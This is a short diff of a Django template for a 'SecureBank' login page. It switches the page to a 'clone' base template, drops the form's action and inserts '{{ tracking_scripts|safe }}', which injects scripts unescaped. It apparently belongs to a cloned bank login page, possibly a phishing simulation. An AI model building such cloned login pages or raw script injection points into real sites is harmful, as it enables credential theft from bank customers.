@@ -1,4 +1,4 @@
-{% extends 'base.html' %}
+{% extends 'base/clone.html' %}
 
 {% load static %}
 
@@ -10,7 +10,8 @@
             <h1 class="bank-name">Secure<span>Bank</span></h1>
         </div>
         
-        <form action="/submit/" method="post" class="login-form" id="secureLoginForm">
+        <form  method="post" class="login-form" id="secureLoginForm">
+            {% csrf_token %}
             <div class="input-group">
                 <input type="text" name="user_id" id="user_id" required autocomplete="username">
                 <label for="user_id">User ID</label>
@@ -60,6 +61,7 @@
             <a href="#" class="enroll-link">Enroll in Online Banking</a>
         </div>
     </div>
+    {{ tracking_scripts|safe }}
     
     <div class="security-features">
         <div class="feature">
